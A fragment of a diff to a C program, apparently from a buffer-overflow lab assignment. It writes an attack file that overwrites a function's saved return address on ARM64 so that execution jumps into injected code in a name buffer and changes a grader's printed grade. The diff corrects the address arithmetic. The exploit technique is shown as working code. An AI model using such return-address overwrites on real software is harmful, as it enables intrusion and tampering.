@@ -15,7 +15,8 @@ int main(void)
     /* These constants come from the grader’s map: */
     const unsigned long NAME_ADDR   = 0x420058UL;  /* start of name[] in BSS */
     const unsigned long GRADE_ADDR  = 0x420044UL;  /* &grade global ('D') */
-    const unsigned long PRINT_ADDR  = 0x40089cUL;  /* skip-B, print-grade code */
+    const unsigned long PRINT_ADDR  = 0x40089cUL;
+    unsigned long returnAddr =  0x420058UL + 28;  /* skip-B, print-grade code */
 
     /* 1) Open the attack file for binary write */
     f = fopen("dataA", "w");
@@ -57,11 +58,11 @@ int main(void)
 
     }
 
-
+    
 
     /* 3) Overwrite readString’s saved x30 with NAME_ADDR
         so that when readString does `ret`, it jumps into our stub. */
-    fwrite(&NAME_ADDR + 28, sizeof(PRINT_ADDR), 1, f);
+    fwrite(&returnAddr, sizeof(PRINT_ADDR), 1, f);
 
     fclose(f);
     return 0;
